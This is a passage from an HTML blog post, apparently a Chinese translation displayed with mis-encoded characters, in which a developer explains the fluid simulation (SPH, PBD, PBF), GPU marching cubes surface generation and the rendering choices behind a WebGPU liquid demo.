<li><strong>å‡ ä½•ç”Ÿæˆ</strong>ï¼šç”¨ GPU ä¸Šçš„ marching cubesï¼Œä»ç²’å­ç”Ÿæˆæ¸²æŸ“ç”¨ä¸‰è§’å½¢ã€‚</li>
<li><strong>å‡ ä½•æ¸²æŸ“</strong>ï¼šä½¿ç”¨è·ç¦»åœºä¼°ç®—å‡ ä½•åšåº¦ä»¥åšæ¬¡è¡¨é¢æ•£å°„ï¼ˆSSSï¼‰ï¼Œå¹¶ç”¨ä½“ç´ é”¥è¿½è¸ªï¼ˆVoxel Cone Tracingï¼‰è®¡ç®— AOã€‚</li>
<li><strong>åˆæˆ</strong>ï¼šåœ°é¢åå°„æ¨¡ç³Šã€è°ƒè‰²ä¸ Bloom ç­‰åæœŸã€‚</li>
</ul>
<h2 data-id="heading-4">æµä½“æ¨¡æ‹Ÿ</h2>
<p>å¾ˆå¤šå¹´å‰ï¼Œå¦‚æœä½ æƒ³åœ¨å›¾å½¢åœˆå­é‡Œâ€œæ˜¾å¾—å¾ˆé…·â€ï¼Œä½ å¾—è¯æ˜ä½ èƒ½è‡ªå·±åšæµä½“æ¨¡æ‹Ÿï¼šåš 2D å°±å¾ˆå¼ºï¼Œåš 3D å°±æ˜¯â€œå°ç¥â€ï¼ˆå½“ç„¶è¿™æ˜¯æˆ‘è„‘å†…çš„ä¸­äºŒè®¾å®šï¼‰ã€‚ä¸ºäº†â€œå°ç¥â€ï¼ˆä¹Ÿä¸ºäº†èµ¢èµŒå±€ï¼‰ï¼Œæˆ‘å¼€å§‹ç–¯ç‹‚è¯» 3D æ¨¡æ‹Ÿç›¸å…³çš„èµ„æ–™ã€‚</p>
<p>åšæµä½“çš„æ–¹æ³•å¾ˆå¤šï¼Œå…¶ä¸­ä¸€ç§å« <strong>SPH</strong>ã€‚ç†æ€§åšæ³•åº”è¯¥æ˜¯å…ˆè¯„ä¼°å“ªä¸ªæ–¹æ³•æ›´é€‚åˆ Webï¼Œä½†æˆ‘å½“æ—¶é€‰å®ƒå°±å› ä¸ºåå­—å¬èµ·æ¥å¾ˆé…·ã€‚SPH æ˜¯ç²’å­æ³•ï¼Œè¿™ä¸€ç‚¹é•¿æœŸæ¥çœ‹å¾ˆæœ‰å¥½å¤„ï¼Œå› ä¸ºåæ¥æˆ‘æŠŠ SPH æ¢æˆäº† position based çš„æ–¹æ³•ã€‚</p>
<p>å¦‚æœä½ åšè¿‡â€œç¾¤ä½“è¡Œä¸ºï¼ˆsteering behaviorsï¼‰â€æˆ– flockingï¼Œä¼šæ›´å®¹æ˜“ç†è§£ SPHã€‚</p>
<p>Three.js æœ‰å¾ˆå¤š flocking ç¤ºä¾‹ï¼Œå®ƒåŸºäºå¸å¼•ã€å¯¹é½ã€æ’æ–¥ç­‰ steering è¡Œä¸ºã€‚ç”¨ä¸åŒçš„æƒé‡/å‡½æ•°ï¼Œæ ¹æ®ç²’å­ä¹‹é—´çš„è·ç¦»å†³å®šç²’å­å—å“ªäº›è¡Œä¸ºå½±å“ã€‚</p>
<p>SPH çš„åšæ³•ä¹Ÿæœ‰ç‚¹ç±»ä¼¼ï¼šä½ å…ˆç®—æ¯ä¸ªç²’å­çš„å¯†åº¦ï¼Œå†ç”¨å¯†åº¦ç®—å‹åŠ›ï¼›å‹åŠ›å°±åƒ flocking é‡Œçš„å¸å¼•/æ’æ–¥ï¼Œä½¿ç²’å­é è¿‘æˆ–è¿œç¦»ã€‚å¯†åº¦åˆæ˜¯é‚»åŸŸç²’å­è·ç¦»çš„å‡½æ•°ï¼Œæ‰€ä»¥å‹åŠ›æœ¬è´¨ä¸Šä¹Ÿæ˜¯â€œç”±è·ç¦»é—´æ¥å†³å®šçš„â€ã€‚</p>
<p>SPH çš„ç²˜æ€§é¡¹ï¼ˆviscosityï¼‰ä¹Ÿç±»ä¼¼ flocking çš„å¯¹é½é¡¹ï¼ˆalignmentï¼‰ï¼šè®©ç²’å­é€Ÿåº¦è¶‹å‘é‚»åŸŸçš„å¹³å‡é€Ÿåº¦åœºã€‚</p>
<p>ä¸ºäº†ï¼ˆè¿‡åº¦ï¼‰ç®€åŒ–ï¼Œä½ å¯ä»¥æŠŠ SPH ç†è§£æˆï¼šç»™ flocking å¥—ä¸Šä¸€ç»„æ›´â€œç‰©ç†æ­£ç¡®â€çš„å‚æ•°ï¼Œè®©ç²’å­æ›´åƒæµä½“ã€‚å½“ç„¶ SPH è¿˜ä¼šæ¶‰åŠè¡¨é¢å¼ åŠ›ç­‰æ›´å¤šæ­¥éª¤ï¼Œä¸”å…¶æ ¸å‡½æ•°/æƒé‡è¿œæ¯”è¿™é‡Œæè¿°å¤æ‚ï¼Œä½†å¦‚æœä½ èƒ½æŠŠ flocking åšå¥½ï¼Œç†è§£ SPH ä¼šæ›´è½»æ¾ã€‚</p>
<p>SPH/ç¾¤ä½“è¡Œä¸ºéƒ½æœ‰ä¸€ä¸ªå…±åŒéš¾ç‚¹ï¼šæœ´ç´ å®ç°æ˜¯ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>ï¼Œç²’å­å¤šå°±ä¼šçˆ†ç‚¸ã€‚ä½ éœ€è¦ä¸€ä¸ªåŠ é€Ÿç»“æ„åªæŸ¥è¯¢é™„è¿‘ç²’å­ï¼Œè®©å¤æ‚åº¦ä» <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span> é™åˆ° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>k</mi><mo>â‹…</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(k\cdot n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span>ï¼ˆ<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> æ˜¯æ¯ä¸ªç²’å­è¦æ£€æŸ¥çš„é‚»å±…æ•°ï¼‰ã€‚å¸¸è§åšæ³•æ˜¯ä½“ç´ ç½‘æ ¼ï¼šæ¯ä¸ªä½“ç´ æ ¼å­å­˜æœ€å¤š 4 ä¸ªç²’å­ç´¢å¼•ã€‚</p>
<p>åœ¨è¿™ä¸ªç¤ºä¾‹é‡Œï¼Œç®—æ³•ä¼šæ£€æŸ¥ç²’å­å‘¨å›´ 27 ä¸ªä½“ç´ ï¼Œæ¯ä¸ªä½“ç´ æœ€å¤š 4 ä¸ªç²’å­ï¼Œæ‰€ä»¥æœ€å¤š 108 æ¬¡é‚»åŸŸæ£€æŸ¥ã€‚å¬èµ·æ¥ä¹Ÿä¸å°‘ï¼Œä½†æ¯”æ£€æŸ¥ 8 ä¸‡ä¸ªç²’å­è¦å¥½å¤ªå¤šã€‚</p>
<p>ä½†é‚»åŸŸéå†ä»ç„¶æ˜‚è´µã€‚SPH è¿˜è¦æ±‚å¤šæ¬¡ passï¼šå¯†åº¦ã€å‹åŠ›/ä½ç§»ã€ç²˜æ€§ã€è¡¨é¢å¼ åŠ›â€¦â€¦å½“ä½ æ„è¯†åˆ° GPU ç»å¤§éƒ¨åˆ†ç®—åŠ›éƒ½åœ¨â€œé©±åŠ¨ç²’å­â€æ—¶ï¼Œæ€§èƒ½å°±ä¼šå˜å¾—éå¸¸é‡è¦ã€‚</p>
<p>è€Œä¸” SPH å¾ˆéš¾è°ƒå‚ï¼Œä½ å¾—ç†è§£å¾ˆå¤šå·¥ç¨‹/ç‰©ç†å‚æ•°æ‰èƒ½åšå¾—å¥½çœ‹ã€‚</p>
<p>åæ¥ NVidia æå‡ºäº†ä¸€å¥—ç²’å­åŠ¨åŠ›å­¦æ–¹æ³•ï¼š<strong>Position Based Dynamicsï¼ˆPBDï¼‰</strong>ï¼Œå…¶ä¸­åŒ…å«åˆšä½“ã€è½¯ä½“ã€æµä½“ã€ç¢°æ’ç­‰ã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fmmacklin.com%2F2017-EG-CourseNotes.pdf" target="_blank" title="https://mmacklin.com/2017-EG-CourseNotes.pdf" ref="nofollow noopener noreferrer">è¯¾ç¨‹ç¬”è®°åœ¨è¿™é‡Œ</a>ã€‚</p>
<p>PBD é€šè¿‡â€œçº¦æŸï¼ˆconstraintsï¼‰â€ç›´æ¥ä¿®æ­£ç²’å­ä½ç½®ï¼Œç»“æœç¨³å®šã€è°ƒå‚ç›¸å¯¹å®¹æ˜“ã€‚è¿™è®©æˆ‘ä» SPH è½¬å‘ <strong>PBFï¼ˆPosition Based Fluidsï¼‰</strong>ã€‚æ ¸å¿ƒå·®åˆ«åœ¨äºï¼šPBF ç”¨çº¦æŸæ¥å®šä¹‰ä½ç§»ï¼Œè€Œä¸æ˜¯åƒ SPH é‚£æ ·å…ˆç®—å¯†åº¦ã€‚</p>
<p>PBF çš„å‚æ•°æ›´â€œæ— é‡çº²â€ï¼Œæ›´å¥½ç†è§£ã€‚</p>
<p>ä½†å®ƒä¹Ÿæœ‰ä»£ä»·ï¼šPBD å¾€å¾€è¦è¿­ä»£å¤šæ¬¡æ‰èƒ½å¾—åˆ°æ›´å¥½ç»“æœï¼ˆè®¡ç®—çº¦æŸã€åº”ç”¨ä½ç§»ã€è®¡ç®—ç²˜æ€§â€¦â€¦åå¤æ‰§è¡Œï¼‰ï¼Œç¨³å®šä½†æ›´æ…¢ã€‚</p>
<p>è€Œæˆ‘ä¸æƒ³åªæ¸²æŸ“ç²’å­ï¼Œæˆ‘è¦æ¸²æŸ“ç½‘æ ¼ï¼šGPU è¿˜è¦ç®—ä¸‰è§’å½¢ã€åšæ¸²æŸ“ã€‚æˆ‘æ²¡æœ‰è¶³å¤Ÿé¢„ç®—åšå¤šè½®è¿­ä»£ï¼Œæ‰€ä»¥æˆ‘å¿…é¡»â€œç è§’â€ã€‚</p>
<p>å¹¸è¿çš„æ˜¯ï¼ŒPBD æœ‰ä¸€ç§å¾ˆä¾¿å®œçš„ç¢°æ’è®¡ç®—æ–¹å¼ï¼šåœ¨æ–½åŠ åŠ›ï¼ˆforcesï¼‰ååšä¸€æ¬¡ pass å³å¯ã€‚æˆ‘é€‰æ‹©ï¼š</p>
<ul>
<li>ç”¨é‡åŠ›ä½œä¸ºä¸»åŠ›ï¼›</li>
<li>ç”¨ curl noise ä½œä¸ºè¾…åŠ©åŠ›ï¼Œå¢åŠ æµä½“æ„Ÿï¼›</li>
<li>ç”¨é¼ æ ‡é©±åŠ¨ä¸€ä¸ªå¾ˆå¼ºçš„æ–¥åŠ›ï¼ˆrepulsionï¼‰ï¼›</li>
<li>è®©ç¢°æ’è´Ÿè´£é¿å…ç²’å­èšæˆå¥‡æ€ªçš„å›¢ã€‚</li>
</ul>
<p>curl + é‡åŠ›æä¾›â€œåƒæµä½“â€çš„æ•´ä½“è¶‹åŠ¿ï¼Œç¢°æ’é¿å…ç²’å­èšå›¢ã€‚å®ƒä¸å¦‚ PBF é‚£ä¹ˆçœŸå®ï¼Œä½†æ›´å¿«ã€‚</p>
<p>å®ç°ä¸Šåªéœ€è¦ä¸€æ¬¡ pass åº”ç”¨æ‰€æœ‰åŠ›ï¼ŒåŒæ—¶åœ¨ storage buffer é‡Œç”Ÿæˆç½‘æ ¼åŠ é€Ÿç»“æ„ï¼›atomics å†™ç´¢å¼•åªéœ€è¦å‡ è¡Œä»£ç ã€‚ä½ å¯ä»¥åœ¨ä»“åº“çš„ <code>PBF_applyForces.wgsl</code> é‡Œè¯»åˆ°åŠ›ä¸ç½‘æ ¼æ„å»ºçš„å®ç°ã€‚</p>
<p>ç²’å­ä½ç½®æ›´æ–°åœ¨ <code>PBF_calculateDisplacements.wgsl</code>ï¼šè´Ÿè´£éå†é‚»åŸŸåšç¢°æ’ï¼Œä¹Ÿè´Ÿè´£å’Œç¯å¢ƒï¼ˆä¸å¯è§åŒ…å›´ç›’ï¼‰ç¢°æ’ã€‚</p>
<p>pipeline ä¸ç»‘å®šåœ¨ <code>PBF.js</code>ï¼šæ¨¡æ‹Ÿåªç”¨ä¸‰ä¸ª shaderâ€”â€”æ–½åŠ›ã€ä½ç§»æ›´æ–°ã€é€Ÿåº¦ç§¯åˆ†ã€‚ä½ç½®æ›´æ–°åï¼Œé€Ÿåº¦é€šè¿‡â€œæ–°ä½ç½® - æ—§ä½ç½®â€çš„å·®å€¼å¾—åˆ°ã€‚</p>
<p>æœ€åä¸€ä¸ª shader <code>PBF_integrateVelocity.wgsl</code> è¿˜ä¼šè®¾ç½®ä¸€ä¸ªåŒ…å«ç²’å­ä¿¡æ¯çš„ 3D çº¹ç†ï¼Œåç»­ä¼šç”¨äº marching cubes ç”ŸæˆåŠ¿åœºã€‚</p>
<h2 data-id="heading-5">Marching Cubesï¼ˆå‡ ä½•ç”Ÿæˆï¼‰</h2>
<p>å½“å¹´æˆ‘ç¬¬ä¸€æ¬¡ç”¨ SPH æŠŠç²’å­è·‘èµ·æ¥æ—¶å…´å¥‹å¾—ä¸è¡Œï¼Œåœ¨åŠå…¬å®¤åˆ°å¤„å¹ï¼ˆåŸºæœ¬åˆ°å¤„éƒ½æ˜¯ï¼‰ã€‚Felix å½“ç„¶çŸ¥é“æ€ä¹ˆæ²»æˆ‘ï¼šä»–æŠŠæˆ‘èµ¶å›å»ç»§ç»­åšâ€œè¡¨é¢ç”Ÿæˆâ€ï¼Œå› ä¸ºåªæœ‰æŠŠæµä½“æ¸²æŸ“æˆæ¶²ä½“è¡¨é¢è€Œä¸æ˜¯ç‚¹ï¼Œæ‰ç®—â€œåƒæ ·â€ã€‚</p>
<p>ä»ç²’å­åœºæ¸²æŸ“è¡¨é¢å¸¸è§æœ‰ä¸‰ç§æ€è·¯ï¼š</p>
<ul>
<li>Point Splatting</li>
<li>Raymarching</li>
<li>Marching Cubes</li>
</ul>
<p>Point splatting æ˜¯æœ€ç®€å•ä¹Ÿæœ€å¿«çš„ä¸€ç§ï¼šå±å¹•ç©ºé—´æ•ˆæœï¼Œæ¸²æŸ“ç²’å­åç»“åˆå¯åˆ†ç¦»æ¨¡ç³Šä¸æ·±åº¦æ¥ç”Ÿæˆæ³•çº¿ã€‚æ•ˆæœå¾ˆä¸é”™ï¼Œè¿˜èƒ½åšç„¦æ•£ï¼Œå®æ—¶æ€§èƒ½ä¹Ÿå¥½ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52e2d6af1d614b8984c5ae358dd1e3fe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5a6J5Lic5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770793485&amp;x-signature=%2BFv1qWiKe3RdlTzFlMsdeN1aWKc%3D" alt="image.png" loading="lazy"/></p>
<p>Raymarching å¾ˆæœ‰è¶£ï¼Œèƒ½åšå¤šæ¬¡åå°„æŠ˜å°„ç­‰å¤æ‚æ•ˆæœï¼Œä½†éå¸¸æ…¢ï¼šä½ éœ€è¦ä»ç²’å­ç”Ÿæˆè·ç¦»åœºï¼Œå†åœ¨è·ç¦»åœºé‡Œåšæ­¥è¿›é‡‡æ ·ï¼ˆè¿‡å»è¿˜æ²¡æœ‰ 3D çº¹ç†ï¼Œåªèƒ½è½¯æ’å€¼ï¼‰ã€‚å³ä½¿ç¡¬ä»¶æ”¯æŒä¸‰çº¿æ€§æ’å€¼ï¼Œæ€§èƒ½ä¹Ÿä¾ç„¶ä¸å¤ªç†æƒ³ã€‚ç”»é¢å¾ˆç¾ï¼Œä½†ä¸é€‚åˆå®æ—¶ã€‚</p>
<p>Marching cubes å¬èµ·æ¥å¾ˆå¸å¼•äººï¼šä»ç²’å­ç”Ÿæˆçš„åŠ¿åœºï¼ˆpotential fieldï¼‰é‡Œæå–ç­‰å€¼é¢ç”Ÿæˆç½‘æ ¼ã€‚ä¼˜ç‚¹æ˜¯ç½‘æ ¼å¯ç›´æ¥æ …æ ¼åŒ–ï¼Œåœ¨é«˜åˆ†è¾¨ç‡ä¸‹ä¹Ÿèƒ½ç¨³å®šæ¸²æŸ“ï¼›å¹¶ä¸”æœ‰äº†ç½‘æ ¼ï¼Œå¾ˆå¤šâ€œåå°„â€å°±èƒ½æ›´ä¾¿å®œåœ°å®ç°ã€‚ä¸å‰ä¸¤ç§æ–¹æ¡ˆç›¸æ¯”ï¼Œå®ƒæ›´å®¹æ˜“ä½œä¸ºä¸–ç•Œç©ºé—´å‡ ä½•ä½“èå…¥åœºæ™¯ã€‚</p>
<p>Three.js æœ‰ marching cubes çš„ä¾‹å­ï¼Œä½†é‚£äº›æ˜¯ CPU ä¸Šç”Ÿæˆè¡¨é¢ï¼›è€Œæˆ‘çš„ç²’å­æ•°æ®åœ¨ GPUã€‚æˆ‘å»è¯» Matt Swoboda çš„åˆ†äº«ï¼Œäº†è§£ä»–å¦‚ä½•åœ¨ GPU ä¸Šåš marching cubesï¼Œä½†é‡Œé¢æœ‰å¾ˆå¤šæˆ‘å½“æ—¶è¿˜ä¸æ‡‚çš„é—®é¢˜ï¼š</p>
<ul>
<li>å¦‚ä½•ä»ç²’å­åœºç”ŸæˆåŠ¿åœºï¼Ÿ</li>
<li>é—´æ¥ dispatch æ˜¯æ€ä¹ˆå›äº‹ï¼Ÿ</li>
<li>å¦‚ä½•åœ¨ GPU ä¸Šç”Ÿæˆä¸‰è§’å½¢ï¼Ÿ</li>
</ul>
<p>å…ˆæŠŠè·¯çº¿å›¾è®²æ¸…æ¥šã€‚Marching cubes æœ¬è´¨æ˜¯ä»åŠ¿åœºæå–ç­‰å€¼é¢ï¼ˆiso-surfaceï¼‰ã€‚å…³é”®æ­¥éª¤æœ‰ï¼š</p>
<ol>
<li>ä»ç²’å­ç”ŸæˆåŠ¿åœºï¼ˆpotentialï¼‰ã€‚</li>
<li>åœ¨ä½“ç´ ç½‘æ ¼ä¸Šè¯„ä¼°åŠ¿å€¼ï¼Œå†³å®šæ¯ä¸ªä½“ç´ å¯¹åº” 256 ç§â€œcaseâ€é‡Œå“ªä¸€ç§ï¼ˆæ¯ä¸ªä½“ç´ ä¼šç”Ÿæˆ 0 åˆ° 5 ä¸ªä¸‰è§’å½¢ï¼‰ã€‚</li>
<li>GPU ä¸ŠæŠŠæ»¡è¶³æ¡ä»¶çš„ä½“ç´ å†™å…¥è¿ç»­ bufferï¼ˆç”¨ atomics è¿½åŠ ï¼‰ã€‚</li>
<li>æ ¹æ®ä½“ç´ ä¿¡æ¯ç”Ÿæˆä¸‰è§’å½¢ã€‚</li>
</ol>
<h3 data-id="heading-6">åŠ¿åœºç”Ÿæˆï¼ˆPotential Generationï¼‰</h3>
<p>å¦‚æœä½ äº†è§£ point splattingï¼Œä¼šå‘ç°â€œæ¨¡ç³Šâ€å¾ˆå…³é”®ï¼šå®ƒèƒ½æŠŠç‚¹äº‘å¹³æ»‘æˆè¿‘ä¼¼è¡¨é¢ã€‚åŒæ ·æ€è·¯ä¹Ÿé€‚ç”¨äº 3D çº¹ç†ï¼šå¯¹ 3D çº¹ç†åš blurï¼Œå°±èƒ½å¾—åˆ°ä¸€ç§â€œç©·äººç‰ˆè·ç¦»åœºâ€ã€‚</p>
<p>ä½ ä¹Ÿå¯ä»¥ç”¨ Jump Flood ç®—æ³•ç”Ÿæˆæ›´ç²¾ç¡®çš„è·ç¦»åœºï¼ˆç²’å­ä¹Ÿå¯ä»¥ï¼‰ï¼Œçœ‹èµ·æ¥è¿˜å¯èƒ½æ¯” 3D blur æ›´å¿«â€”â€”ä½†å®ƒæœ‰ä¸ªè‡´å‘½ç¼ºç‚¹ï¼šå®ƒ<strong>å¤ªç²¾ç¡®</strong>äº†ã€‚</p>
<p>Jump Flood çš„ç»“æœæ›´åƒæ˜¯ä¸€ç»„çƒä½“çš„è·ç¦»åœºï¼Œç­‰å€¼é¢é˜ˆå€¼ä¸åŒä¼šæŠŠçƒâ€œè¿èµ·æ¥â€ï¼Œä½†ä¸ä¼šä»¥ä¸€ç§â€œå¥½çœ‹â€çš„æ–¹å¼å¹³æ»‘ã€‚ä½ å¾—æœ‰éå¸¸å¤šçš„ç²’å­æ‰ä¼šåƒè¿ç»­è¡¨é¢ï¼Œè€Œé‚£ç§æƒ…å†µä¸‹ä½ å€’ä¸å¦‚ç›´æ¥ç”¨ point splattingã€‚</p>
<p>3D blur åè€Œä¼šæŠŠç²’å­â€œæŠ¹å¼€â€ï¼Œå»æ‰é«˜é¢‘çš„é¢—ç²’æ„Ÿï¼Œè®©å®ƒæ›´åƒè¡¨é¢ã€‚blur æ¬¡æ•°è¶Šå¤šï¼Œè¡¨é¢è¶Šå¹³æ»‘ï¼›ä½ ä¹Ÿèƒ½å°è¯•ä¸åŒ blur æ–¹å¼æ··åˆå‡ºä¸åŒçš„è¡¨é¢æ•ˆæœã€‚å¥‡å¦™çš„æ˜¯ï¼šè¿™ä¸ªç®€å•åŠæ³•åœ¨è¿™é‡Œåè€Œæ›´å¿«ã€æ›´å®ç”¨ã€‚</p>
<p>å®ç°ä¸Šï¼Œblur ç”¨ compute shader <code>Blur3D.wgsl</code>ï¼Œæ²¿ä¸‰ä¸ªè½´å„ dispatch ä¸€æ¬¡ï¼›ç»‘å®šä¸ dispatch åœ¨ <code>Blur3D.js</code>ã€‚</p>
<h3 data-id="heading-7">ä½“ç´ ç­›é€‰ï¼ˆChecking voxelsï¼‰</h3>
<p>åŠ¿åœºç”Ÿæˆåï¼Œæˆ‘ç”¨å¦ä¸€ä¸ª compute shader æ‰«æä½“ç´ ç½‘æ ¼ï¼Œæ‰¾å‡ºä¼šç”Ÿæˆä¸‰è§’å½¢çš„ä½“ç´ ã€‚ä»“åº“é‡Œçš„ <code>MarchCase.wgsl</code> ä¼šéå†æ•´ä¸ªä½“ç´ ç½‘æ ¼ï¼Œä¸ºéœ€è¦ç”Ÿæˆä¸‰è§’å½¢çš„ä½“ç´ è®¡ç®— marching cubes caseï¼Œå¹¶ç”¨ atomics æŠŠè¯¥ä½“ç´ çš„ 3D åæ ‡ä¸ case è¿ç»­å†™å…¥ storage bufferã€‚</p>
<p>ç„¶å <code>EncodeBuffer.wgsl</code> è¯»å–ä¸Šä¸€æ­¥å¾—åˆ°çš„ä½“ç´ æ•°é‡ï¼Œç¼–ç å‡ºç”¨äºâ€œé—´æ¥ dispatchâ€çš„å‚æ•°ï¼ˆä¸‰è§’å½¢ç”Ÿæˆéœ€è¦å¤šå°‘é¡¶ç‚¹ï¼‰ä»¥åŠâ€œé—´æ¥ drawâ€çš„å‚æ•°ï¼ˆéœ€è¦ç»˜åˆ¶å¤šå°‘ä¸‰è§’å½¢ï¼‰ã€‚</p>
<h3 data-id="heading-8">ä¸‰è§’å½¢ç”Ÿæˆï¼ˆTriangles Generationï¼‰</h3>
<p>è´Ÿè´£ç”Ÿæˆé¡¶ç‚¹/æ³•çº¿çš„ shader æ˜¯ <code>GenerateTriangles.wgsl</code>ã€‚å®ƒæ ¹æ®æ¯ä¸ªçº¿ç¨‹çš„å…¨å±€ç´¢å¼•å®šä½åˆ°å¯¹åº”ä½“ç´ å’Œè¦ç”Ÿæˆçš„é¡¶ç‚¹ï¼Œå¹¶é€šè¿‡ <code>EncodeBuffer.wgsl</code> äº§ç”Ÿçš„é—´æ¥ dispatch æ¥è¿è¡Œã€‚</p>
<p>ä½“ç´ ä¿¡æ¯ç”¨äºåœ¨è¾¹çš„ä¸¤ä¸ªè§’ç‚¹ä¹‹é—´åšçº¿æ€§æ’å€¼ï¼Œå¾—åˆ°é¡¶ç‚¹ä½ç½®ï¼›æ³•çº¿åˆ™æ¥è‡ªè¾¹ä¸¤ç«¯è§’ç‚¹æ¢¯åº¦ï¼ˆgradientï¼‰çš„çº¿æ€§æ’å€¼ã€‚</p>
<p>åŠ¿åœºç”Ÿæˆã€ä½“ç´ æ”¶é›†ã€ä¸‰è§’å½¢ç”Ÿæˆè¿™äº›æ­¥éª¤åœ¨ <code>TrianglesGenerator.js</code> çš„ <code>generateTriangles</code> å‡½æ•°é‡Œä¸²èµ·æ¥ï¼Œæ¯æ¬¡ç²’å­ä½ç½®æ›´æ–°åéƒ½ä¼šè°ƒç”¨ã€‚</p>
<h2 data-id="heading-9">æ¸²æŸ“</h2>
<p>è¿™äº›å¹´æˆ‘æœ€å¤§çš„é”™è¯¯ä¹‹ä¸€ï¼Œæ˜¯æŠŠâ€œæ¨¡æ‹Ÿ/GPGPU æŠ€æœ¯â€çœ‹å¾—æ¯”â€œè§†è§‰ç¾æ„Ÿâ€æ›´é‡è¦ã€‚æˆ‘å¤ªæ‰§ç€äºè¯æ˜è‡ªå·±èƒ½åšå¤æ‚ä¸œè¥¿ï¼Œè€Œå¿½ç•¥äº†æœ€ç»ˆç”»é¢ã€‚</p>
<p>Felix ç»å¸¸åœ¨æˆ‘å‡†å¤‡å‘å¸ƒ Demo ä¹‹å‰æ‹¦ä½æˆ‘ï¼šèŠ±æ›´å¤šæ—¶é—´æŠŠç”»é¢æ‰“ç£¨å¾—æ›´èˆ’æœï¼Œåˆ«åªåšæˆé‚£ç§â€œåªæœ‰å››ä¸ªäººä¼šè§‰å¾—å¾ˆé…·â€çš„æŠ€æœ¯å±•ç¤ºã€‚</p>
<p>ç›¸ä¿¡æˆ‘ï¼šä½ å¯ä»¥åšå¾ˆå¼ºçš„ç‰©ç†æ¨¡æ‹Ÿã€å¾ˆå¤æ‚çš„æè´¨â€”â€”ä½†å¦‚æœçœ‹èµ·æ¥å¾ˆç³Ÿç³•ï¼Œé‚£å®ƒå°±æ˜¯ç³Ÿç³•ã€‚</p>
<p>æµä½“çš„éš¾ç‚¹åœ¨äºï¼šä½ å·²ç»æŠŠå¤§é‡ GPU æ—¶é—´èŠ±åœ¨ç²’å­åŠ¨åŠ›å­¦å’Œè¡¨é¢ç”Ÿæˆä¸Šäº†ï¼Œç•™ç»™æ¸²æŸ“æ•ˆæœçš„é¢„ç®—ä¸å¤šï¼›è¿˜è¦ç»™åœºæ™¯é‡Œå…¶å®ƒä¸œè¥¿ç•™æ—¶é—´ã€‚æ‰€ä»¥å®æ—¶æµä½“ä¸€èˆ¬å¾ˆéš¾åšåˆ°â€œæè‡´ç”»è´¨â€ã€‚</p>
<p>å®æ—¶æ¸²æŸ“æ¶²ä½“çš„æœ€ä¼˜è§£é€šå¸¸æ˜¯ point splattingï¼šåå°„ã€æŠ˜å°„ã€é˜´å½±ã€ç„¦æ•£éƒ½èƒ½åšï¼Œè€Œä¸”å¾ˆâ€œä¾¿å®œâ€ã€‚ä¸ä¿¡å¯ä»¥çœ‹çœ‹è¿™ä¸ªå¾ˆæ£’çš„ Demoï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwebgpu-ocean.netlify.app%2F" target="_blank" title="https://webgpu-ocean.netlify.app/" ref="nofollow noopener noreferrer">webgpu-ocean.netlify.app/</a></p>
